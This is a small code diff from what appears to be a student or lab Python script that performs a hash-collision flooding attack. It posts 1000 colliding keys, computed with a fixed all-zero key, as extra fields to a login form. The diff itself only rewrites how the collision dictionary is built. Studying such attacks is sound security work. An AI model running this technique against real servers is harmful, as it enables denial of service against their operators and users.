@@ -12,6 +12,7 @@ def do_login_form(sess, username,password,params=None):
 			}
 	if not params is None:
 		data_dict.update(params)
+	# should return status of 200 if successful
 	response = sess.post(LOGIN_FORM_URL,data_dict)
 	print(response)
 
@@ -27,10 +28,11 @@ def do_attack():
 	key = b'\x00'*16
 	collisions_1000 = find_collisions(key, 1000)
 	print("test")
-	attack_dict = {
-		c: i for i, c in enumerate(collisions_1000)
-	}
-	response = do_login_form(sess, uname,pw,attack_dict)
+	collisions_dict = {}
+	for i, c in enumerate(collisions_1000):
+			collisions_dict[c] = i
+	print(collisions_dict)
+	response = do_login_form(sess, uname, pw, collisions_dict)
 	print("bruh")
 
 
